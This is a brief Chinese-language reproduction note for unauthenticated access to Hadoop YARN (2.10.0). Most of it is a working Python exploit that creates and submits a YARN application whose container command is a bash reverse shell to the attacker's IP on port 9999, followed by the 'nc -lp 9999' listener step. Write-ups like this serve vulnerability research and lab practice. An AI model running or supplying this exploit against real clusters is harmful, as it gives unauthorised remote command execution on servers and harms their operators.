# Hadoop未授权访问

## 1.环境搭建

+ Ubuntu18，Hadoop2.10.0
+ https://blog.csdn.net/Evankaka/article/details/51612437

## 2.复现

exp.py

```python
import requests

target = 'http://10.251.0.189:8088/'
lhost = '10.251.0.105' # put your local host ip here, and listen at port 9999

url = target + 'ws/v1/cluster/apps/new-application'
resp = requests.post(url)
app_id = resp.json()['application-id']
url = target + 'ws/v1/cluster/apps'
data = {
    'application-id': app_id,
    'application-name': 'get-shell',
    'am-container-spec': {
        'commands': {
            'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,
        },
    },
    'application-type': 'YARN',
}
requests.post(url, json=data)
```

攻击机上执行

> python exp.py

10.251.0.105上执行

> nc -lp 9999